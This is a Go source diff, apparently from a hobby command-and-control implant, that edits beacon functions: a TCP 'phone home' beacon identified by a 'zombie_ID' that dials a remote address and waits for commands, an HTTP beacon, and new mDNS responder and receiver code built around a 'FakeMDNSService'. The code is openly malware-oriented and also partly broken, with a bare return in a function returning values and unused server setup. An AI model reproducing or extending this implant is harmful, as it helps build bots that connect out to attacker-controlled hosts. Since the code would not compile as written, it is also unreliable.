@@ -8,8 +8,12 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"net"
 	"net/http"
+	"os"
+
+	"github.com/hashicorp/mdns"
 )
 
 // Beacons
@@ -20,11 +24,11 @@ import (
 // if a "good password *HINT*" is provided
 // put the id of the entity connecting to let the host know it's us
 func BaconTCP(zombie_ID string) {
-	shared_code.PHONEHOME_TCP.IP = net.IP(shared_code.Remote_tcpaddr)
-	connection, derp := net.DialTCP("tcp", &shared_code.Local_tcpaddr_LAN, &shared_code.PHONEHOME_TCP)
+	PHONEHOME_TCP.IP = net.IP(Remote_tcpaddr)
+	connection, derp := net.DialTCP("tcp", &Local_tcpaddr_LAN, &PHONEHOME_TCP)
 	if derp != nil {
 		// print the error
-		shared_code.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
+		Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
 		return
 	}
 	// now we just wait...
@@ -38,7 +42,7 @@ func BaconTCP(zombie_ID string) {
 		netData, derp := bufio.NewReader(connection).ReadString('\n')
 		if derp != nil {
 			// print the error
-			shared_code.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
+			Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
 			return
 		}
 	}
@@ -73,9 +77,53 @@ func BeaconHTTP(command_url string, request_type string) (*http.Response, error)
 			return http_response, derp
 		}
 	}
+	return
 }
 
-func BeaconDNS(name) {
-	MDNS_BEACON := shared_code.FakeMDNSService{}
-	shared_code.StartMdnsReceiver(MDNS_BEACON)
+/*/
+MDNS: https://en.wikipedia.org/wiki/Multicast_DNS
+https://tools.ietf.org/html/rfc6762
+
+resolves hostnames to IP addresses within small networks that do not include
+a local name server. It is a zero-configuration service, using essentially the
+same programming interfaces, packet formats and operating semantics as the unicast
+Domain Name System (DNS). Although Stuart Cheshire designed mDNS as a stand-alone
+protocol, it can work in concert with standard DNS servers.
+
+An mDNS message is a multicast UDP packet sent using the following addressing:
+
+    IPv4 address 224.0.0.251
+	IPv6 address ff02::fb
+    UDP port 5353
+    When using Ethernet frames, the standard IP multicast MAC address:
+		01:00:5E:00:00:FB (for IPv4)
+		33:33:00:00:00:FB (for IPv6)
+/*/
+func MdnsResponder() {
+	// Make a channel for results and start listening
+	entriesCh := make(chan *mdns.ServiceEntry, 4)
+	go func() {
+		for entry := range entriesCh {
+			fmt.Printf("Got new entry: %v\n", entry)
+		}
+	}()
+	// Start the lookup
+	mdns.Lookup("_foobar._tcp", entriesCh)
+	close(entriesCh)
+}
+
+func StartMdnsReceiver(service_name string, false_service_struct FakeMDNSService) {
+	// Setup our service export
+	host, _ := os.Hostname()
+	info := []string{service_name}
+	service, _ := mdns.NewMDNSService(host, "_foobar._tcp", "", "", 8000, nil, info)
+	// assign to struct
+	fake_mdns_service := FakeMDNSService{}
+	fake_mdns_service.host = host
+	fake_mdns_service.info = info[0]
+	fake_mdns_service.service = *service
+
+	// Create the mDNS server, defer shutdown
+	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
+	defer server.Shutdown()
 }
